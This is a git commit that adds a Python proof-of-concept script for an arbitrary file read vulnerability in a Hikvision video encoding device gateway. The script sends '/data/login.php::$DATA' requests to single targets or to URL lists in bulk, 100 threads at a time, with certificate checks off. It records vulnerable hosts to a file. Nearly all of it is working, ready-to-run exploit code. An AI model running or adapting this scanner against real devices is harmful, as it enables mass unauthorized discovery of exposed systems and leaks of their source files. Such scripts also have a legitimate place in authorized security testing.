ffc5b2c71ac2d81564fa555e7fee328e1c5cc7f1
Qiuyv <117554162+wangshubinm@users.noreply.github.com>
2025-05-08 10:09:36 +0800

    Add files via upload

---
+++ HIKVISION 视频编码设备接入网关 $DATA 任意文件读取/HIKVISION 视频编码设备接入网关 $DATA 任意文件读取.py
@@ -0,0 +1,53 @@
+import requests, re, os, sys, argparse
+from multiprocessing.dummy import Pool
+
+from urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+def main():
+    url_list = []
+    parse = argparse.ArgumentParser(description="这是一个关于海康威视的扫描脚本")
+    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter your url")
+    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter your file")
+
+    args = parse.parse_args()
+
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        with open(args.file, 'r', encoding='utf-8') as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace('\n', ''))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+
+def poc(target):
+    payload = '/data/login.php::$DATA'
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
+    }
+    proxy = {
+        'http': '127.0.0.1:8080',
+        'https': '127.0.0.1.:8080'
+    }
+    try:
+        res1 = requests.get(url="http://"+target + payload, headers=headers, verify=False, proxies=proxy, timeout=5)
+        if res1.status_code == 200 and 'system' in res1.text:
+            print(f"[+]{target}存在漏洞")
+            with open('文件读取.txt', 'a', encoding='utf-8') as f:
+                    f.write(target + '\n')
+        else:
+            print(f"[-]{target}不存在漏洞")
+    except Exception as e:
+        print(f"[E]{target}请求异常: {str(e)}")
+
+
+if __name__ == '__main__':
+    main()
